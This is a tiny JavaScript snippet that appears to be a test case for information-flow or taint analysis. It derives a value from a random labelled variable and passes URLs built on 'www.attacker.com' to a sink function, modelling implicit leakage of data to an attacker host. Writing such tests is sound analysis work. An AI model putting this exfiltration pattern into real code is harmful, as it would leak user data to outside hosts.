var i =  Math.floor((Math.random() * 10) + 1); 

var h = lbl(i);

url = urll("www.attacker.com" + 1);
sink('Sink', '', url);

if (h > 5) {var l  = 1;} 


url1 = urll("www.attacker.com" + l);
sink('Sink', '', url1);
